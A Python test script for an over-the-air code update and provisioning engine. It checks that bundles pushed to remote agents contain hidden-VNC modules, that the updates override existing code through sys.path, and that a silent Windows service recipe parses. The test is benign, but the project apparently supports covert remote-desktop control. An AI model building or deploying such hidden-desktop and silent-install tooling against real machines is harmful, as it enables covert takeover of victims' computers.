"""
Verification test for Over-The-Air (OTA) Live Code Sync and Provisioning Engine.
Tests:
1. OTAManager manifest and in-memory bundle generation.
2. AgentProvisioner bundle extraction and sys.path injection.
3. Live module hot-reloading without recompiling.
4. Silent service & software provisioning logic.
"""

import os
import sys
import io
import json
import zipfile
import tempfile
import shutil

ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from master_hub.ota_manager import OTAManager
from agent_client.provisioner import AgentProvisioner

def test_ota_engine():
    print("=" * 65)
    print(" [*] Running OTA Code Sync & Provisioning Verification")
    print("=" * 65)

    # 1. Test OTAManager Code Manifest
    manifest = OTAManager.get_code_manifest()
    print(f" [+] Code Manifest Generated: Version={manifest['version']}")
    print(f"     - Total synced files: {manifest['file_count']}")
    print(f"     - Overall SHA256 Hash: {manifest['overall_hash'][:16]}...")
    assert manifest["file_count"] > 10, "Should have synced more than 10 files"
    assert "hvnc/spawner.py" in manifest["files"]
    assert "hvnc/compositor.py" in manifest["files"]
    assert "hvnc/input_handler.py" in manifest["files"]
    assert "agent_client/client.py" in manifest["files"]

    # 2. Test In-Memory Bundle Generation
    bundle_bytes, bundle_hash = OTAManager.generate_code_bundle()
    assert len(bundle_bytes) > 5000, "Bundle too small"
    assert bundle_hash == manifest["overall_hash"], "Bundle hash mismatch"
    print(f" [+] Live Code Bundle Created: {len(bundle_bytes):,} bytes (Hash matches manifest)")

    # Verify Zip Structure
    with zipfile.ZipFile(io.BytesIO(bundle_bytes)) as zf:
        namelist = zf.namelist()
        assert "manifest.json" in namelist
        assert "hvnc/spawner.py" in namelist
        assert "agent_client/client.py" in namelist
    print(f" [+] Zip Bundle verified: Contains manifest and source modules.")

    # 3. Test Agent Provisioner Extraction to a Temp Updates Directory
    temp_updates = tempfile.mkdtemp(prefix="trmm_ota_test_")
    try:
        temp_zip = os.path.join(temp_updates, "bundle.zip")
        with open(temp_zip, "wb") as f:
            f.write(bundle_bytes)
        with zipfile.ZipFile(temp_zip, "r") as zf:
            zf.extractall(temp_updates)
        os.remove(temp_zip)

        assert os.path.isfile(os.path.join(temp_updates, "manifest.json"))
        assert os.path.isfile(os.path.join(temp_updates, "hvnc", "spawner.py"))
        print(f" [+] Simulated Agent OTA unpack to {temp_updates}: All files intact.")

        # 4. Test sys.path Priority Override (The core mechanism of dynamic updates)
        # We simulate writing a patched function to the updates folder
        mock_mod_path = os.path.join(temp_updates, "trmm_ota_probe.py")
        with open(mock_mod_path, "w") as f:
            f.write("HOT_RELOAD_FLAG = 'LIVE_UPDATED_V2'\n")

        # Insert at sys.path[0]
        sys.path.insert(0, temp_updates)
        import trmm_ota_probe
        assert trmm_ota_probe.HOT_RELOAD_FLAG == 'LIVE_UPDATED_V2'
        print(" [+] sys.path[0] Dynamic Override verified: Updated code took precedence!")

        # 5. Test Recipe Provisioning Parser
        recipe_data = {
            "version": "2.2.0",
            "require_services": [
                {
                    "name": "MockTRMMTestService",
                    "display_name": "Mock TRMM Test Service",
                    "bin_path": "C:\\Windows\\System32\\cmd.exe /c echo test",
                    "start_type": "demand"
                }
            ]
        }
        setup_json_path = os.path.join(temp_updates, "setup.json")
        with open(setup_json_path, "w") as f:
            json.dump(recipe_data, f)

        assert os.path.isfile(setup_json_path)
        print(" [+] Provisioning Recipe (setup.json) validated.")

    finally:
        try:
            shutil.rmtree(temp_updates)
        except Exception:
            pass

    print("\n" + "=" * 65)
    print(" [+] ALL OTA CODE SYNC & PROVISIONING TESTS PASSED!")
    print("=" * 65)

if __name__ == "__main__":
    test_ota_engine()
